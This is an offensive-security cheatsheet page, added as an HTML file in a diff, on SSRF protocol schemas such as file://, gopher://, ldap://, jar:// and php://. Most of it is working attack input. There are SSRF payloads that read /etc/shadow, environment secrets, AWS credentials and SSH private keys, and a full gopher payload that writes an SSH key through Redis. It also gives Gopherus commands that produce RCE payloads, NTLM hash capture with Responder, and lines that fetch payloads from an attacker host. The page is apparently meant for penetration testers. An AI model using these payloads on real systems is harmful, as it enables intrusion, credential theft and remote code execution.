@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Schemas · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Schemas</h1><p class="cx-lede">SSRF protocol schemas - http/https, file://, gopher:// for protocol smuggling, ftp://, dict://, and others.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190</span><span class="cx-tag">D3FEND D3-MH, D3-OTF</span><span class="cx-tag">IMPACT InternalAccess, FileRead</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>The schema (<code>http://</code>, <code>file://</code>, <code>gopher://</code>, etc.) determines what protocol the server speaks for you. <code>http(s)</code> reaches HTTP services; <code>file://</code> reads local files; <code>gopher://</code> smuggles raw bytes to any TCP service that tolerates HTTP-shaped garbage at the top of its protocol. Try them in this order:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://&lt;COLLAB&gt;                    # confirm SSRF
+http://127.0.0.1:80                # localhost reachable
+file:///etc/passwd                 # local file read
+gopher://127.0.0.1:6379/_&lt;PAYLOAD&gt; # Redis/SMTP/Memcached smuggling</code></pre></figure>
+<p>Available schemas depend on the URL-parsing library. Python <code>urllib</code> supports <code>http/https/file/ftp</code>. PHP's <code>file_get_contents</code> supports a long list including <code>phar://</code> and <code>expect://</code>. <code>curl</code>-backed code supports <code>gopher://</code>. Java URLConnection has <code>jar://</code>. Different libraries → different surfaces.</p>
+<h2 id="schema-reference">Schema reference</h2>
+<table>
+<thead>
+<tr>
+<th>Schema</th>
+<th>What it does</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://</code>, <code>https://</code></td>
+<td>Standard HTTP</td>
+<td>First thing to try; works almost everywhere</td>
+</tr>
+<tr>
+<td><code>file://</code></td>
+<td>Read local files</td>
+<td>Highest-value local primitive - see below</td>
+</tr>
+<tr>
+<td><code>ftp://</code></td>
+<td>FTP fetch</td>
+<td>Curl/Python/PHP - read remote files via FTP server you control</td>
+</tr>
+<tr>
+<td><code>gopher://</code></td>
+<td>Raw TCP send with arbitrary bytes</td>
+<td>Best for protocol smuggling; curl-only</td>
+</tr>
+<tr>
+<td><code>dict://</code></td>
+<td>DICT protocol</td>
+<td>Curl supports it; sometimes reaches Memcached</td>
+</tr>
+<tr>
+<td><code>ldap://</code>, <code>ldaps://</code></td>
+<td>LDAP queries</td>
+<td>Java applications; sometimes leak NTLM hashes from Windows</td>
+</tr>
+<tr>
+<td><code>jar://</code></td>
+<td>Java archive resolution</td>
+<td>Java/Spring; can fetch remote JARs as a side effect</td>
+</tr>
+<tr>
+<td><code>php://</code></td>
+<td>PHP wrapper</td>
+<td>PHP-only; <code>php://filter</code> for source code with base64</td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td>PHP Archive</td>
+<td>PHP-only; deserialization vector</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>PHP expect extension</td>
+<td>RCE if the extension is loaded; rare</td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td>Inline data</td>
+<td>Sometimes bypasses URL filters</td>
+</tr>
+<tr>
+<td><code>netdoc://</code></td>
+<td>Java legacy file read</td>
+<td>Java-only; alternative to <code>file://</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="https">http(s)://</h2>
+<p>The boring one, but it's where you start. Confirms SSRF with an OOB callback before you bother trying anything fancier.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Confirm
+?url=http://&lt;COLLAB&gt;
+
+# Localhost
+?url=http://127.0.0.1:80
+?url=http://127.0.0.1:8080
+?url=http://127.0.0.1:5000
+
+# Internal hostnames (often resolve when localhost is filtered)
+?url=http://internal.app.local
+?url=http://api-internal
+?url=http://admin.internal</code></pre></figure>
+<p><code>http</code> and <code>https</code> behave identically for SSRF purposes - TLS doesn't add or remove attack surface. Use <code>http</code> to skip cert validation issues.</p>
+<h2 id="file">file://</h2>
+<p>The single most valuable non-HTTP schema. When <code>file://</code> works, you have local file disclosure without needing any internal network reachability.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=file:///etc/passwd
+?url=file:///etc/shadow                          # if app runs as root
+?url=file:///proc/self/environ                  # current process env vars
+?url=file:///proc/self/cmdline                  # process arguments
+?url=file:///var/www/html/.env                  # framework secrets
+?url=file:///root/.aws/credentials              # AWS CLI creds
+?url=file:///root/.ssh/id_rsa                   # SSH keys
+?url=file:///proc/net/tcp                       # listening sockets - internal port discovery</code></pre></figure>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p><code>/proc/self/environ</code> is the best first read on Linux. It reveals environment variables (often containing DB credentials, API keys, JWT secrets) and tells you the working directory of the application, which informs subsequent reads.</p>
+</div>
+<p>Some libraries require triple-slash (<code>file:///</code>), some accept double-slash. Try both:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=file:///etc/passwd
+?url=file://etc/passwd
+?url=file:/etc/passwd
+?url=file:////etc/passwd        # works around some normalizers</code></pre></figure>
+<h3 id="reading-non-text-files">Reading non-text files</h3>
+<p>Binary files (<code>.so</code>, <code>.jar</code>, images) often render as garbled text in the HTTP response. Save the raw response and read offline:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -s &quot;http://&lt;TARGET&gt;/?url=file:///app/lib/secret.jar&quot; -o secret.jar
+unzip -l secret.jar</code></pre></figure>
+<h2 id="gopher-protocol-smuggling">gopher:// - protocol smuggling</h2>
+<p>The reason SSRF is so dangerous against internal services. Gopher is an obsolete protocol whose URL syntax allows arbitrary bytes after <code>gopher://host:port/_</code>. The underscore is consumed; everything after is sent as raw TCP.</p>
+<p>This means: if any internal TCP service tolerates HTTP-shaped garbage at the top of its protocol (Redis, Memcached, SMTP, FTP, MySQL with cleartext auth, etc.), you can speak that protocol <em>through</em> the SSRF.</p>
+<h3 id="redis-port-6379">Redis (port 6379)</h3>
+<p>Default Redis is unauthenticated and bound to <code>127.0.0.1</code>. Classic target.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Goal: write an SSH key to /root/.ssh/authorized_keys
+# Build the Redis command sequence:
+#   CONFIG SET dir /root/.ssh/
+#   CONFIG SET dbfilename authorized_keys
+#   SET x &quot;\n\n&lt;your ssh public key&gt;\n\n&quot;
+#   SAVE
+
+# As a gopher URL (URL-encoded twice - once for the gopher payload, once for the SSRF parameter):
+?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%24&lt;LEN&gt;%0d%0a&lt;KEY-PUBKEY-DATA&gt;%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2411%0d%0a/root/.ssh/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%2415%0d%0aauthorized_keys%0d%0a*1%0d%0a%244%0d%0asave%0d%0a%0a</code></pre></figure>
+<p>Don't hand-craft these. Use <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">git clone https://github.com/tarunkant/Gopherus
+cd Gopherus
+python2 gopherus.py --exploit redis
+# Choose RCE method: PHP shell / SSH key / cron job
+# Outputs ready-to-use gopher URL - URL-encode it once more for the SSRF parameter</code></pre></figure>
+<h3 id="memcached-port-11211">Memcached (port 11211)</h3>
+<p>Similar idea - unauthenticated by default, accepts cleartext commands:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python2 gopherus.py --exploit memcached
+# Choose: stats / store key / retrieve / delete</code></pre></figure>
+<p>Useful when the internal Memcached caches authenticated session tokens - store a malicious session, then use it from the outside.</p>
+<h3 id="mysql-port-3306">MySQL (port 3306)</h3>
+<p>Pre-auth MySQL is binary protocol - gopher works but Gopherus generates the binary correctly:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python2 gopherus.py --exploit mysql
+# Requires: known MySQL user with no password (rare but exists in dev/staging)</code></pre></figure>
+<h3 id="smtp-port-25">SMTP (port 25)</h3>
+<p>Plain SMTP from the internal network - send phishing as <code>internal-app@&lt;TARGET&gt;</code>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python2 gopherus.py --exploit smtp</code></pre></figure>
+<p>Useful for internal phishing pivots when the application server has SMTP outbound that you don't.</p>
+<h3 id="fastcgi-port-9000">FastCGI (port 9000)</h3>
+<p>PHP-FPM listening on TCP 9000 with default config → RCE via FastCGI binary protocol:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python2 gopherus.py --exploit fastcgi
+# Requires: known PHP file path on the target</code></pre></figure>
+<p>This is one of the highest-impact SSRF chains - common in Docker setups where the LAMP stack is split across containers and PHP-FPM is exposed without auth between containers.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Curl is the canonical gopher consumer. Python's <code>urllib.request</code> does <em>not</em> support gopher - if the SSRF runs through <code>urllib</code>, gopher won't work. Test with a benign payload (<code>gopher://&lt;COLLAB&gt;:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a</code>) before building a real exploit.</p>
+</div>
+<h2 id="ftp">ftp://</h2>
+<p>Useful for two things: fetching remote files you serve, and reading from internal FTP servers.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Pull from your FTP
+?url=ftp://&lt;ATTACKER&gt;/payload.html
+
+# Hit internal FTP
+?url=ftp://internal-ftp/sensitive/file.txt
+
+# With auth
+?url=ftp://user:pass@internal-ftp/file.txt</code></pre></figure>
+<p>Set up a quick FTP server:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib -p 21 -w</code></pre></figure>
+<h2 id="dict">dict://</h2>
+<p>Defined-words protocol. Curl supports it. Sometimes reaches Memcached (cleartext text protocol):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=dict://127.0.0.1:11211/stats
+?url=dict://127.0.0.1:6379/info       # Redis sometimes accepts dict-shaped probes</code></pre></figure>
+<p>Less powerful than gopher (single command per request, no binary control), but useful for quick probing of text protocols.</p>
+<h2 id="ldap-ldaps">ldap://, ldaps://</h2>
+<p>Java apps. The interesting case isn't reading LDAP data - it's that Windows-hosted Java apps doing LDAP lookups will issue NTLM authentication, and you can capture the NetNTLM hashes:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Set up Responder or impacket-ntlmrelayx on your host
+sudo responder -I eth0
+
+# Trigger the SSRF
+?url=ldap://&lt;ATTACKER&gt;/
+
+# Captured: NetNTLMv2 hash of the service account</code></pre></figure>
+<p>This crosses into Windows post-exploitation territory; covered properly in a future Windows section. For SSRF purposes: an LDAP-capable Java SSRF on a Windows host = hash steal.</p>
+<h2 id="jar-java">jar:// (Java)</h2>
+<p>Resolves resources from JAR archives, fetching the JAR over HTTP first:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=jar:http://&lt;ATTACKER&gt;/payload.jar!/file</code></pre></figure>
+<p>Side effect: the server downloads <code>payload.jar</code>. If the application's class loader picks it up (uncommon but possible in classpath-relative resolvers), code execution. Also a confirmation channel for Java SSRF when http schemas are filtered.</p>
+<h2 id="php-phar-expect-php">php://, phar://, expect:// (PHP)</h2>
+<p>PHP's wrapper system is the broadest of any language:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Read source code base64-encoded
+?url=php://filter/convert.base64-encode/resource=index.php
+
+# Read source through multiple filters
+?url=php://filter/read=convert.base64-encode/resource=/etc/passwd
+
+# Phar deserialization (requires controlled phar file)
+?url=phar:///tmp/uploaded.phar/payload
+
+# Expect - RCE if extension loaded
+?url=expect://id</code></pre></figure>
+<p><code>php://filter</code> for source code is the highest-yield PHP-specific SSRF primitive. The wrappers <code>convert.base64-encode</code> solves the "binary content garbled in HTTP response" problem by encoding before transmission.</p>
+<h2 id="data">data://</h2>
+<p>Inline data, sometimes bypasses URL allowlists that check for <code>http</code>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=data:text/plain,Hello                       # plaintext
+?url=data:text/html,&lt;script&gt;fetch(&#x27;//attacker&#x27;)&lt;/script&gt;   # html
+?url=data:text/plain;base64,SGVsbG8K            # base64-wrapped</code></pre></figure>
+<p>PHP supports <code>data://</code> natively. Useful when the filter requires a specific schema prefix but doesn't validate further.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Schema works but fetched content not returned.</strong> SSRF is one-way - the server made the request, the response was discarded. You have blind SSRF; switch to <a href="../blind/index.html">blind techniques</a> for confirmation/exfil.</li>
+<li><strong><code>file://</code> blocked but <code>http://localhost/...</code> works.</strong> Application uses two different fetchers - one for HTTP, one for arbitrary URLs, with different allowlists. The HTTP-only fetcher might still serve files via a static-file endpoint reachable from localhost.</li>
+<li><strong>Gopher fails with curl-style error.</strong> SSRF runs through Python's <code>urllib</code> or another library that doesn't support gopher. No way around this - switch to a different schema or escalate via http to an internal service that <em>does</em> run curl.</li>
+<li><strong><code>http://</code> URLs work but <code>file://</code> doesn't, on a Java app.</strong> Java's <code>URL</code> class disables <code>file://</code> by default in some recent JDKs (security manager). Try <code>netdoc://</code> as a Java-specific equivalent.</li>
+<li><strong>Schema URL parsed but no request issued.</strong> The library validated the URL syntactically but blocked the actual fetch. Look for schema allowlists in the source code if you have it (Ghostcat, LFI), or use <a href="../filter-bypass/index.html">filter bypass</a> techniques.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>The schemas that survive filtering are usually the unusual ones - developers blocklist <code>file://</code> and forget about <code>dict://</code>, <code>gopher://</code>, <code>jar://</code>. When the obvious schemas fail, work through the list rather than giving up. Library-quirk-driven schema availability is one of the things that makes SSRF feel like a different bug class on every engagement.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../intermediary/ghostcat/index.html">Previous: Ghostcat (CVE-2020-1938)</a><a class="cx-next" href="../internal-discovery/index.html">Next: Internal discovery</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
